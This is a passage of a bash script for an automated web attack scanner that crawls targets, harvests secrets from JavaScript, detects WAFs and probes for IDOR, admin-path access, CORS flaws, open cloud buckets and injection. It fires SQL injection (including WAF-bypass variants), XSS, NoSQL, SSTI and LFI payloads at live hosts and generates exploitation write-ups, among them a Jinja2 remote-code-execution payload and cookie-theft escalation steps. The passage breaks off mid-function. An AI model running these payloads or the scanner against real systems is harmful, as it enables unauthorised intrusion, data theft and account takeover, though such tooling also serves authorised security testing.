cat "$MASTER_URLS" "$OUT_DIR/03-endpoints/katana_crawl.txt" 2>/dev/null \
    | sort -u > "$MASTER_ENDPOINTS"
log_success "Total endpoints: $(count_lines "$MASTER_ENDPOINTS")"
check_skip || { end_phase 3; }

# ── 3b. JS file collection ───────────────────────────────────────────────
log_info "JS file collection..."
grep -Ei "\.js(\?|$)" "$MASTER_ENDPOINTS" \
    | grep -v "\.json" | sort -u > "$MASTER_JS" 2>/dev/null || true
if command -v subjs &>/dev/null && [ -s "$MASTER_WEB" ]; then
    t_run 180 subjs -i "$MASTER_WEB" 2>/dev/null >> "$MASTER_JS" || true
    sort -u "$MASTER_JS" -o "$MASTER_JS" 2>/dev/null || true
fi
log_stat "JS files: $(count_lines "$MASTER_JS")"
check_skip || { end_phase 3; }

# ── 3c. Source map detection ──────────────────────────────────────────────
log_info "Source map detection..."
: > "$OUT_DIR/06-js-analysis/sourcemaps_found.txt"
JS_COUNT=0
while IFS= read -r jsurl; do
    check_skip || break
    JS_COUNT=$(( JS_COUNT + 1 ))
    [ $(( JS_COUNT % 10 )) -eq 0 ] && log_stat "Checked $JS_COUNT JS files..."
    MAP="${jsurl}.map"
    CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$MAP" 2>/dev/null || echo "000")
    [[ "$CODE" == "200" ]] && {
        SOURCES=$(t_run 15 curl -sk --max-time 10 "$MAP" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin); [print(s) for s in d.get('sources',[])]
except: pass" 2>/dev/null | head -10 | tr '\n' ',')
        echo "[SOURCE MAP] $MAP | Sources: $SOURCES" >> "$OUT_DIR/06-js-analysis/sourcemaps_found.txt"
        log_found "Source map: $MAP"
    }
done < <(safe_cat "$MASTER_JS" | head -80)
check_skip || { end_phase 3; }

# ── 3d. JS secret extraction ─────────────────────────────────────────────
log_info "JS secret extraction..."
: > "$OUT_DIR/06-js-analysis/js_secrets.txt"
SECRET_PATTERNS='(api[_-]?key|apikey|secret|token|password|passwd|auth|bearer|private[_-]?key|access[_-]?key|client[_-]?secret|aws[_-]?key|stripe[_-]?key|slack[_-]?token|github[_-]?token|firebase)[^\n]{0,5}[=:]\s*["'"'"'][^"'"'"']{8,}'
JS_IDX=0
while IFS= read -r jsurl; do
    check_skip || break
    JS_IDX=$(( JS_IDX + 1 ))
    CONTENT=$(t_run 20 curl -sk --max-time 15 "$jsurl" 2>/dev/null | head -c 100000)
    [ -z "$CONTENT" ] && continue
    HITS=$(echo "$CONTENT" | grep -oP "$SECRET_PATTERNS" 2>/dev/null | head -20)
    [ -n "$HITS" ] && {
        printf "\n--- %s ---\n%s\n" "$jsurl" "$HITS" >> "$OUT_DIR/06-js-analysis/js_secrets.txt"
        log_found "Possible secret in JS: $jsurl"
    }
    # GraphQL endpoint detection
    echo "$CONTENT" | grep -qiE "(graphql|__schema|__type|query\s*\{)" && {
        echo "$jsurl" >> "$OUT_DIR/03-endpoints/graphql_hints.txt"
    }
    # Internal endpoint discovery
    echo "$CONTENT" | grep -oP '"(/[a-zA-Z0-9_/\-]{3,})"' 2>/dev/null | \
        tr -d '"' | grep -v "^//" >> "$OUT_DIR/03-endpoints/js_internal_paths.txt" || true
done < <(safe_cat "$MASTER_JS" | head -100)
sort -u "$OUT_DIR/03-endpoints/js_internal_paths.txt" \
    -o "$OUT_DIR/03-endpoints/js_internal_paths.txt" 2>/dev/null || true
log_stat "JS internal paths: $(count_lines "$OUT_DIR/03-endpoints/js_internal_paths.txt")"

# ── 3e. Parameter extraction ─────────────────────────────────────────────
log_info "Parameter extraction..."
grep -oP "(\?|&)[a-zA-Z0-9_\-]+=([^&\s\"'#]*)" "$MASTER_ENDPOINTS" \
    | sort -u > "$MASTER_PARAMS" 2>/dev/null || true

if command -v arjun &>/dev/null && [ -s "$MASTER_WEB" ] \
   && [ "${PHASE_SKIP:-false}" = false ]; then
    while IFS= read -r url; do
        check_skip || break
        t_run 90 arjun -u "$url" --stable -q \
            -oJ "$OUT_DIR/04-parameters/arjun_$(echo "$url" | md5sum | cut -c1-8).json" \
            2>/dev/null || true
    done < <(safe_cat "$MASTER_WEB" | shuf | head -30)
fi

if command -v ffuf &>/dev/null; then
    PARAM_WL=""
    for wl in \
        "$SECLISTS/Discovery/Web-Content/burp-parameter-names.txt" \
        "$SECLISTS/Discovery/Web-Content/api-endpoints.txt"; do
        [ -f "$wl" ] && { PARAM_WL="$wl"; break; }
    done
    [ -n "$PARAM_WL" ] && while IFS= read -r url; do
        check_skip || break
        t_run 90 ffuf -u "${url}?FUZZ=test" -w "$PARAM_WL" \
            -mc 200,301,302,400 -ac -t 30 -s \
            -o "$OUT_DIR/04-parameters/ffuf_$(echo "$url" | md5sum | cut -c1-8).json" \
            -of json 2>/dev/null || true
    done < <(safe_cat "$MASTER_WEB" | head -15)
fi

log_success "Parameters collected: $(count_lines "$MASTER_PARAMS")"
end_phase 3
fi


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 4: TECH FINGERPRINT + WAF DETECTION
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 4; then
start_phase 4 "TECHNOLOGY FINGERPRINT & WAF DETECTION"

WAF_DETECTED_FILE="$OUT_DIR/02-fingerprint/waf_detected.txt"
: > "$WAF_DETECTED_FILE"

while IFS= read -r url; do
    check_skip || break
    HEADERS=$(t_run 15 curl -sk -I --max-time 10 "$url" 2>/dev/null || true)
    SERVER=$(echo "$HEADERS" | grep -i "^server:" | cut -d' ' -f2- | tr -d '\r')
    X_POWERED=$(echo "$HEADERS" | grep -i "^x-powered-by:" | cut -d' ' -f2- | tr -d '\r')
    [ -n "$SERVER" ]     && printf "[SERVER] %s | %s\n" "$url" "$SERVER" >> "$MASTER_TECH"
    [ -n "$X_POWERED" ]  && printf "[X-POWERED] %s | %s\n" "$url" "$X_POWERED" >> "$MASTER_TECH"

    # WAF detection via error probe
    WAF_CODE=$(t_run 12 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
        "${url}/<script>alert(1)</script>" 2>/dev/null || echo "000")
    WAF_HDR=$(echo "$HEADERS" | grep -iE \
        "(x-sucuri|x-waf|cf-ray|x-fw-|x-cache|akamai|incapsula|imperva|barracuda|aws-waf)" \
        | head -1 | tr -d '\r')
    if [[ "$WAF_CODE" == "403" || "$WAF_CODE" == "406" || "$WAF_CODE" == "429" \
        || -n "$WAF_HDR" ]]; then
        printf "[WAF] %s | Code:%s | Header:%s\n" "$url" "$WAF_CODE" "$WAF_HDR" \
            >> "$WAF_DETECTED_FILE"
        log_warn "WAF detected on $url — injection tests will use bypass payloads"
    fi

    # CMS detection
    BODY=$(t_run 15 curl -sk --max-time 10 "$url" 2>/dev/null | head -c 8192)
    echo "$BODY" | grep -qi "wp-content\|wordpress" && \
        printf "[CMS:WordPress] %s\n" "$url" >> "$MASTER_TECH"
    echo "$BODY" | grep -qi "joomla" && \
        printf "[CMS:Joomla] %s\n" "$url" >> "$MASTER_TECH"
    echo "$BODY" | grep -qi "drupal" && \
        printf "[CMS:Drupal] %s\n" "$url" >> "$MASTER_TECH"
    echo "$BODY" | grep -qi "react\|__NEXT_DATA__" && \
        printf "[Framework:React/Next.js] %s\n" "$url" >> "$MASTER_TECH"
    echo "$BODY" | grep -qi "angular\|ng-" && \
        printf "[Framework:Angular] %s\n" "$url" >> "$MASTER_TECH"
    echo "$BODY" | grep -qi "graphql\|__schema" && \
        printf "[API:GraphQL] %s\n" "$url" >> "$MASTER_TECH"
done < <(safe_cat "$MASTER_WEB" | head -50)

log_success "Tech fingerprints: $(count_lines "$MASTER_TECH")"
log_stat "WAF-protected hosts: $(count_lines "$WAF_DETECTED_FILE")"
end_phase 4
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 5: OWASP A01 — BROKEN ACCESS CONTROL (IDOR + PRIVILEGE ESCALATION)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 5; then
start_phase 5 "OWASP A01 — BROKEN ACCESS CONTROL (IDOR + PRIVESC + BAC)"
log_owasp "A01:2025 Broken Access Control"

IDOR_DIR="$OUT_DIR/05-owasp/a01-access-control"

# ── 5a. IDOR — integer ID pattern ────────────────────────────────────────
log_info "IDOR scan — integer ID pattern..."
: > "$IDOR_DIR/idor_findings.txt"
INT_ID_PARAMS=$(grep -oP "(\?|&)(id|user_id|account_id|order_id|doc_id|file_id|msg_id|ticket_id|profile_id|item_id)=\d+" \
    "$MASTER_ENDPOINTS" 2>/dev/null | sort -u)

while IFS= read -r param_hit; do
    check_skip || break
    URL_BASE=$(grep -F "$param_hit" "$MASTER_ENDPOINTS" | head -1)
    [ -z "$URL_BASE" ] && continue
    PNAME=$(echo "$param_hit" | grep -oP "[a-z_]+" | head -1)
    PVAL=$(echo "$param_hit" | grep -oP "\d+" | head -1)
    [ -z "$PNAME" ] || [ -z "$PVAL" ] && continue

    BASE_RESP=$(t_run 15 curl -sk --max-time 10 "$URL_BASE" 2>/dev/null)
    BASE_HASH=$(echo "$BASE_RESP" | md5sum | cut -d' ' -f1)
    BASE_SIZE=${#BASE_RESP}
    [ "$BASE_SIZE" -lt 30 ] && continue

    FOUND_IDOR=false
    for OFFSET in 1 -1 2 100 9999; do
        check_skip || break
        NEW_VAL=$(( PVAL + OFFSET ))
        [ "$NEW_VAL" -le 0 ] && continue
        TEST_URL=$(echo "$URL_BASE" | sed "s/${PNAME}=${PVAL}/${PNAME}=${NEW_VAL}/g")
        sleep 0.3
        TEST_RESP=$(t_run 15 curl -sk --max-time 10 "$TEST_URL" 2>/dev/null)
        TEST_CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
            "$TEST_URL" 2>/dev/null || echo "000")
        TEST_HASH=$(echo "$TEST_RESP" | md5sum | cut -d' ' -f1)
        TEST_SIZE=${#TEST_RESP}
        # FP filters: size must be reasonable, code 200, content differs
        [[ "$TEST_CODE" == "200" && "$TEST_SIZE" -gt 30 && "$TEST_HASH" != "$BASE_HASH" ]] && \
        ! echo "$TEST_RESP" | grep -qiE "(not found|access denied|forbidden|unauthorized|error 404)" && {
            echo "[IDOR] ${TEST_URL} | Offset:${OFFSET} | Status:${TEST_CODE} | Size:${TEST_SIZE}" \
                >> "$IDOR_DIR/idor_findings.txt"
            log_found "IDOR: $TEST_URL (offset $OFFSET)"
            FOUND_IDOR=true; break
        }
    done
    [ "$FOUND_IDOR" = true ] && write_poc \
        "IDOR — Insecure Direct Object Reference" "HIGH" "A01:2025 Broken Access Control" \
        "$URL_BASE" \
        "# Baseline request (your own data)\ncurl -sk '${URL_BASE}'\n\n# IDOR test (another user's data)\ncurl -sk '${TEST_URL}'" \
        "API returns data for other users without authorization check." \
        "1. Login as User A\n2. Note: ${PNAME}=${PVAL}\n3. Change to: ${PNAME}=$(( PVAL + 1 ))\n4. Response contains another user's data → IDOR confirmed"
done < <(echo "$INT_ID_PARAMS")
check_skip || { end_phase 5; }

# ── 5b. IDOR — UUID/GUID pattern ────────────────────────────────────────
log_info "IDOR scan — UUID/GUID pattern..."
UUID_ENDPOINTS=$(grep -oP "https?://[^\s]+/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[^\s]*" \
    "$MASTER_ENDPOINTS" 2>/dev/null | head -20 | sort -u)
while IFS= read -r u; do
    check_skip || break
    [ -z "$u" ] && continue
    FAKE_UUID="00000000-0000-0000-0000-000000000001"
    TEST_U=$(echo "$u" | sed "s|[0-9a-f]\{8\}-[0-9a-f]\{4\}-[0-9a-f]\{4\}-[0-9a-f]\{4\}-[0-9a-f]\{12\}|${FAKE_UUID}|g")
    CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$TEST_U" 2>/dev/null || echo "000")
    [[ "$CODE" == "200" ]] && {
        echo "[UUID IDOR] $TEST_U | Status:$CODE" >> "$IDOR_DIR/idor_findings.txt"
        log_found "UUID IDOR possible: $TEST_U"
    }
done < <(echo "$UUID_ENDPOINTS")
check_skip || { end_phase 5; }

# ── 5c. Privilege escalation — admin path access with user session ────────
log_info "Privilege escalation probe..."
: > "$IDOR_DIR/privesc_findings.txt"
ADMIN_PATHS=("/admin" "/admin/" "/admin/users" "/admin/config" "/admin/dashboard"
    "/api/admin" "/api/v1/admin" "/api/internal" "/internal" "/management"
    "/superuser" "/staff" "/moderator" "/root" "/system")
while IFS= read -r base; do
    check_skip || break
    BASE_DOMAIN=$(echo "$base" | grep -oP "https?://[^/]+")
    for path in "${ADMIN_PATHS[@]}"; do
        check_skip || break
        TEST="${BASE_DOMAIN}${path}"
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$TEST" 2>/dev/null || echo "000")
        [[ "$CODE" == "200" || "$CODE" == "302" || "$CODE" == "301" ]] && {
            SIZE=$(t_run 10 curl -sk --max-time 8 "$TEST" 2>/dev/null | wc -c || echo 0)
            [ "$SIZE" -gt 100 ] && {
                echo "[PRIVESC] $TEST | Status:$CODE | Size:$SIZE" >> "$IDOR_DIR/privesc_findings.txt"
                log_found "Admin path accessible: $TEST ($CODE)"
            }
        }
    done
done < <(safe_cat "$MASTER_WEB" | head -20)

log_success "IDOR findings: $(count_lines "$IDOR_DIR/idor_findings.txt")"
log_success "PrivEsc findings: $(count_lines "$IDOR_DIR/privesc_findings.txt")"
end_phase 5
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 6: OWASP A02 — SECURITY MISCONFIGURATION (CORS, HEADERS, CLOUD)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 6; then
start_phase 6 "OWASP A02 — SECURITY MISCONFIGURATION (CORS, HEADERS, CLOUD ASSETS)"
log_owasp "A02:2025 Security Misconfiguration"

MISCONFIG_DIR="$OUT_DIR/05-owasp/a02-misconfig"

# ── 6a. CORS misconfiguration ─────────────────────────────────────────────
log_info "CORS misconfiguration scan..."
: > "$MISCONFIG_DIR/cors_findings.txt"
CORS_ORIGINS=("https://evil.com" "https://attacker.com"
    "null" "https://${DOMAIN}.evil.com" "https://evil${DOMAIN}")
while IFS= read -r url; do
    check_skip || break
    for origin in "${CORS_ORIGINS[@]}"; do
        RESP_HDRS=$(t_run 15 curl -sk -I --max-time 10 \
            -H "Origin: $origin" "$url" 2>/dev/null || true)
        ACAO=$(echo "$RESP_HDRS" | grep -i "access-control-allow-origin:" \
            | tr -d '\r' | cut -d' ' -f2-)
        ACAC=$(echo "$RESP_HDRS" | grep -i "access-control-allow-credentials:" \
            | tr -d '\r' | cut -d' ' -f2-)
        [[ "$ACAO" == "$origin" || "$ACAO" == "*" ]] && \
        [[ "${ACAC,,}" == "true" || "$ACAO" == "$origin" ]] && {
            MSG="[CORS] $url | Origin:$origin | ACAO:$ACAO | ACAC:$ACAC"
            echo "$MSG" >> "$MISCONFIG_DIR/cors_findings.txt"
            log_found "CORS: $url"
            [[ "$ACAO" == "$origin" && "${ACAC,,}" == "true" ]] && \
            write_poc \
                "CORS — Reflected Origin with Credentials Allowed" "HIGH" \
                "A02:2025 Security Misconfiguration" "$url" \
                "curl -sk -I -H 'Origin: $origin' '$url' | grep -i access-control" \
                "CORS reflects attacker origin with credentials:true. Full cross-origin data theft." \
                "1. Host PoC page at $origin\n2. fetch('$url',{credentials:'include'})\n3. Response body fully accessible → session hijack"
            break
        }
    done
done < <(safe_cat "$MASTER_WEB" | head -50)
check_skip || { end_phase 6; }

# ── 6b. Security headers audit ────────────────────────────────────────────
log_info "Security headers audit..."
: > "$MISCONFIG_DIR/security_headers.txt"
EXPECTED_HEADERS=("Strict-Transport-Security" "Content-Security-Policy"
    "X-Frame-Options" "X-Content-Type-Options"
    "Referrer-Policy" "Permissions-Policy")
while IFS= read -r url; do
    check_skip || break
    HDR_RESP=$(t_run 12 curl -sk -I --max-time 8 "$url" 2>/dev/null | tr -d '\r')
    MISSING=()
    for h in "${EXPECTED_HEADERS[@]}"; do
        echo "$HDR_RESP" | grep -qi "^${h}:" || MISSING+=("$h")
    done
    [ ${#MISSING[@]} -gt 0 ] && {
        printf "[MISSING HEADERS] %s | %s\n" "$url" "${MISSING[*]}" \
            >> "$MISCONFIG_DIR/security_headers.txt"
        log_stat "Missing headers on $url: ${MISSING[*]}"
    }
    # Check for dangerous headers
    echo "$HDR_RESP" | grep -qi "X-Powered-By:" && {
        VAL=$(echo "$HDR_RESP" | grep -i "X-Powered-By:" | head -1)
        printf "[INFO LEAK HEADER] %s | %s\n" "$url" "$VAL" \
            >> "$MISCONFIG_DIR/security_headers.txt"
    }
    # Clickjacking: no X-Frame-Options AND no CSP frame-ancestors
    echo "$HDR_RESP" | grep -qi "X-Frame-Options:" || {
        echo "$HDR_RESP" | grep -qi "frame-ancestors" || {
            printf "[CLICKJACK] %s | No X-Frame-Options or CSP frame-ancestors\n" "$url" \
                >> "$MISCONFIG_DIR/security_headers.txt"
        }
    }
done < <(safe_cat "$MASTER_WEB" | head -50)
check_skip || { end_phase 6; }

# ── 6c. Cloud bucket discovery ────────────────────────────────────────────
if [ "${CLOUD_MODE:-false}" = true ] || [ "${PHASE_SKIP:-false}" = false ]; then
    log_info "Cloud asset discovery..."
    : > "$OUT_DIR/07-cloud/bucket_findings.txt"
    CLEAN_DOMAIN=$(echo "$DOMAIN" | sed 's/\./-/g')
    BUCKET_NAMES=(
        "$DOMAIN" "$CLEAN_DOMAIN" "www-$CLEAN_DOMAIN"
        "assets-$CLEAN_DOMAIN" "static-$CLEAN_DOMAIN" "media-$CLEAN_DOMAIN"
        "backup-$CLEAN_DOMAIN" "dev-$CLEAN_DOMAIN" "staging-$CLEAN_DOMAIN"
        "api-$CLEAN_DOMAIN" "data-$CLEAN_DOMAIN" "files-$CLEAN_DOMAIN"
    )
    for name in "${BUCKET_NAMES[@]}"; do
        check_skip || break
        # S3
        for s3url in \
            "https://${name}.s3.amazonaws.com" \
            "https://s3.amazonaws.com/${name}" \
            "https://${name}.s3-us-east-1.amazonaws.com"; do
            CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
                --max-time 7 "$s3url" 2>/dev/null || echo "000")
            [[ "$CODE" == "200" || "$CODE" == "403" ]] && {
                printf "[BUCKET S3] %s | Status:%s\n" "$s3url" "$CODE" \
                    >> "$OUT_DIR/07-cloud/bucket_findings.txt"
                [[ "$CODE" == "200" ]] && log_critical "Open S3 bucket: $s3url"
            }
        done
        # GCS
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
            --max-time 7 "https://storage.googleapis.com/${name}" 2>/dev/null || echo "000")
        [[ "$CODE" == "200" ]] && {
            printf "[BUCKET GCS OPEN] https://storage.googleapis.com/%s\n" "$name" \
                >> "$OUT_DIR/07-cloud/bucket_findings.txt"
            log_critical "Open GCS bucket: $name"
        }
    done
fi

log_success "CORS findings: $(count_lines "$MISCONFIG_DIR/cors_findings.txt")"
log_success "Security header issues: $(count_lines "$MISCONFIG_DIR/security_headers.txt")"
log_success "Cloud bucket findings: $(count_lines "$OUT_DIR/07-cloud/bucket_findings.txt")"
end_phase 6
fi


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 7: OWASP A05 — INJECTION (SQLi, XSS, XXE, NoSQL, CMDi, LFI, SSTI)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 7; then
start_phase 7 "OWASP A05 — INJECTION (SQLi, XSS, XXE, NoSQL, CMDi, LFI, SSTI)"
log_owasp "A05:2025 Injection"

INJ_DIR="$OUT_DIR/05-owasp/a05-injection"
WAF_ON=false
[ -s "$OUT_DIR/02-fingerprint/waf_detected.txt" ] && WAF_ON=true

# ── 7a. SQL Injection ──────────────────────────────────────────────────────
log_info "SQL Injection testing..."
: > "$INJ_DIR/sqli_findings.txt"

# WAF-bypass payloads when WAF is detected
if [ "$WAF_ON" = true ]; then
    SQLI_PAYLOADS=(
        "1'/**/OR/**/'1'='1"
        "1/*!50000OR*/1=1--"
        "1'%0aOR%0a'1'='1"
        "1'||'1"
        "1\' OR SLEEP(5)--"
        "' OR 1=1-- -"
        "1 UNION SELECT NULL,NULL--"
    )
else
    SQLI_PAYLOADS=(
        "'"
        "'--"
        "' OR '1'='1"
        "' OR 1=1--"
        "' OR SLEEP(5)--"
        "1 UNION SELECT NULL--"
        "' AND 1=2 UNION SELECT 1,2,3--"
    )
fi

SQL_ERROR_PAT="(sql syntax|mysql_|pg_|ora-|sqlite|syntax error|unclosed quotation|odbc|jdbc driver|db2|unknown column|you have an error in your sql)"

while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP "[?&][a-zA-Z0-9_\-]+=" | head -1 | tr -d '?&=')
    VAL=$(echo "$param_line" | grep -oP "=[^&\s]+" | head -1 | cut -c2-)
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue

    for payload in "${SQLI_PAYLOADS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$payload")
        TEST="${URL}?${PARAM}=${ENC}"
        sleep 0.2
        RESP=$(t_run 20 curl -sk --max-time 15 "$TEST" 2>/dev/null)
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$TEST" 2>/dev/null || echo "000")

        # Error-based detection
        echo "$RESP" | grep -qiE "$SQL_ERROR_PAT" && {
            echo "[SQLI ERROR-BASED] $TEST | payload: $payload | code: $CODE" \
                >> "$INJ_DIR/sqli_findings.txt"
            log_found "SQLi (error-based): $TEST"
            write_poc \
                "SQL Injection — Error-Based" "CRITICAL" "A05:2025 Injection" "$TEST" \
                "curl -sk '$TEST'" \
                "SQL error returned in response — database queries exposed to injection." \
                "1. Send: GET ${URL}?${PARAM}=$(urlencode "'")\n2. Observe SQL error in response\n3. Extract: ${URL}?${PARAM}=$(urlencode "' UNION SELECT table_name,NULL FROM information_schema.tables--")"
            break
        }

        # Blind time-based (only for SLEEP payload)
        [[ "$payload" == *"SLEEP"* || "$payload" == *"WAIT"* ]] && {
            T1=$(date +%s%N)
            t_run 12 curl -sk --max-time 10 "$TEST" -o /dev/null 2>/dev/null || true
            T2=$(date +%s%N)
            DIFF=$(( (T2 - T1) / 1000000 ))
            [ "$DIFF" -ge 4500 ] && {
                echo "[SQLI BLIND TIME] $TEST | delay:${DIFF}ms | payload:$payload" \
                    >> "$INJ_DIR/sqli_findings.txt"
                log_found "SQLi (blind time-based): $TEST (${DIFF}ms)"
                write_poc \
                    "SQL Injection — Blind Time-Based" "CRITICAL" "A05:2025 Injection" "$TEST" \
                    "# Time the response — 5s delay = vulnerable\ntime curl -sk '$TEST' -o /dev/null" \
                    "Blind time-based SQLi — DB executes SLEEP() confirming injection point." \
                    "1. Confirm: time curl '$TEST' | check >5s delay\n2. Extract DB version: SLEEP based enumeration\n3. Use sqlmap: sqlmap -u '${URL}?${PARAM}=1' --dbs --level 3"
                break
            }
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -40)
check_skip || { end_phase 7; }

# ── 7b. XSS — Reflected ───────────────────────────────────────────────────
log_info "XSS (reflected) testing..."
: > "$INJ_DIR/xss_findings.txt"
XSS_MARKER="xss_PoC_$(date +%s)"
if [ "$WAF_ON" = true ]; then
    XSS_PAYLOADS=(
        "<img src=x onerror=alert(1)>"
        "'\"><svg/onload=alert(1)>"
        "<details open ontoggle=alert(1)>"
        "javascript:alert(1)"
        "<scr\x00ipt>alert(1)</scr\x00ipt>"
        "%3Cscript%3Ealert(1)%3C/script%3E"
        "<a href=\"javas&#99;ript:alert(1)\">click</a>"
    )
else
    XSS_PAYLOADS=(
        "<script>alert('${XSS_MARKER}')</script>"
        "'\"><script>alert('${XSS_MARKER}')</script>"
        "<img src=x onerror=alert('${XSS_MARKER}')>"
        "<svg onload=alert('${XSS_MARKER}')>"
    )
fi
while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP "[?&][a-zA-Z0-9_\-]+=" | head -1 | tr -d '?&=')
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue
    for payload in "${XSS_PAYLOADS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$payload")
        TEST="${URL}?${PARAM}=${ENC}"
        sleep 0.2
        RESP=$(t_run 15 curl -sk --max-time 12 "$TEST" 2>/dev/null)
        CT=$(t_run 10 curl -sk -I --max-time 8 "$TEST" 2>/dev/null \
            | grep -i "content-type:" | tr -d '\r')
        # Only flag if content-type is HTML (avoids JSON reflection false positives)
        echo "$CT" | grep -qi "text/html" && \
        echo "$RESP" | grep -qF "$payload" && {
            echo "[XSS REFLECTED] $TEST | payload: $payload" >> "$INJ_DIR/xss_findings.txt"
            log_found "Reflected XSS: $TEST"
            write_poc \
                "Reflected XSS" "HIGH" "A05:2025 Injection" "$TEST" \
                "# Open in browser:\n$TEST" \
                "User-supplied input reflected in HTML without encoding. Allows script execution." \
                "1. Open URL: $TEST\n2. Payload <script>alert()</script> executes in browser\n3. Escalate: steal document.cookie, perform CSRF"
            break
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -40)
check_skip || { end_phase 7; }

# ── 7c. NoSQL Injection ───────────────────────────────────────────────────
log_info "NoSQL injection testing..."
: > "$INJ_DIR/nosql_findings.txt"
NOSQL_PAYLOADS=(
    '{"$gt":""}' '{"$ne":"invalid"}' '{"$regex":".*"}'
    '{"$where":"1==1"}' '{"$exists":true}'
)
while IFS= read -r url; do
    check_skip || break
    BASELINE_CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
        --max-time 8 "$url" 2>/dev/null || echo "000")
    for payload in "${NOSQL_PAYLOADS[@]}"; do
        check_skip || break
        sleep 0.2
        CODE=$(t_run 12 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
            -H "Content-Type: application/json" -d "$payload" "$url" 2>/dev/null || echo "000")
        [[ "$CODE" == "200" && "$BASELINE_CODE" != "200" ]] && {
            echo "[NOSQL] $url | payload:$payload | baseline:$BASELINE_CODE test:$CODE" \
                >> "$INJ_DIR/nosql_findings.txt"
            log_found "NoSQLi: $url"
            write_poc \
                "NoSQL Injection" "HIGH" "A05:2025 Injection" "$url" \
                "curl -sk -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"\\$ne\":\"invalid\"},\"password\":{\"\\$ne\":\"invalid\"}}' '$url'" \
                "MongoDB/NoSQL operator accepted in JSON body — authentication bypass possible." \
                "1. Send POST with {\"\$ne\":\"invalid\"} in username/password fields\n2. Server returns 200 → auth bypass\n3. Enumerate collections: {\"\$gt\":\"\"}"
            break
        }
    done
done < <(grep -iE "/(api|auth|login|user|account|search|find|query)" \
    "$MASTER_WEB" 2>/dev/null | head -20)
check_skip || { end_phase 7; }

# ── 7d. SSTI (Server-Side Template Injection) ─────────────────────────────
log_info "SSTI testing..."
: > "$INJ_DIR/ssti_findings.txt"
SSTI_PROBES=("{{7*7}}" "\${7*7}" "<%=7*7%>" "#{7*7}" "<%= 7*7 %>")
while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP "[?&][a-zA-Z0-9_\-]+=" | head -1 | tr -d '?&=')
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue
    for probe in "${SSTI_PROBES[@]}"; do
        check_skip || break
        ENC=$(urlencode "$probe")
        TEST="${URL}?${PARAM}=${ENC}"
        RESP=$(t_run 12 curl -sk --max-time 10 "$TEST" 2>/dev/null)
        echo "$RESP" | grep -qP "\b49\b" && {
            echo "[SSTI] $TEST | probe:$probe" >> "$INJ_DIR/ssti_findings.txt"
            log_found "SSTI: $TEST → 7*7=49 reflected"
            write_poc \
                "SSTI — Server-Side Template Injection" "CRITICAL" "A05:2025 Injection" "$TEST" \
                "# Probe: 7*7=49\ncurl -sk '$TEST'\n\n# RCE (Jinja2): ?${PARAM}={{config.__class__.__init__.__globals__['os'].popen('id').read()}}" \
                "Template engine evaluates arithmetic expression. Full RCE achievable via OS command execution." \
                "1. Confirm: probe returns 49\n2. Identify engine (Jinja2/Twig/Pebble)\n3. Exploit: {{config.items()}} → env vars\n4. RCE: popen('id').read()"
            break
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -30)
check_skip || { end_phase 7; }

# ── 7e. LFI (Local File Inclusion) ───────────────────────────────────────
log_info "LFI testing..."
: > "$INJ_DIR/lfi_findings.txt"
LFI_PAYLOADS=("../../../etc/passwd" "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "/etc/passwd" "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts")
while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP "[?&](file|path|page|include|template|view|dir|load|read|document|name)=" \
        | head -1 | tr -d '?&=')
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue
    for payload in "${LFI_PAYLOADS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$payload")
        TEST="${URL}?${PARAM}=${ENC}"
        RESP=$(t_run 12 curl -sk --max-time 10 "$TEST" 2>/dev/null)
        echo "$RESP" | grep -qP "root:.*:0:0|daemon:|bin:/bin" && {
            echo "[LFI] $TEST | payload:$payload" >> "$INJ_DIR/lfi_findings.txt"
            log_critical "LFI → /etc/passwd: $TEST"
            write_poc \
                "LFI — Local File Inclusion (/etc/passwd)" "CRITICAL" "A05:2025 Injection" "$TEST" \
                "curl -sk '$TEST'" \
                "File inclusion reaches /etc/passwd. Full filesystem read access — escalate to RCE via log poisoning." \
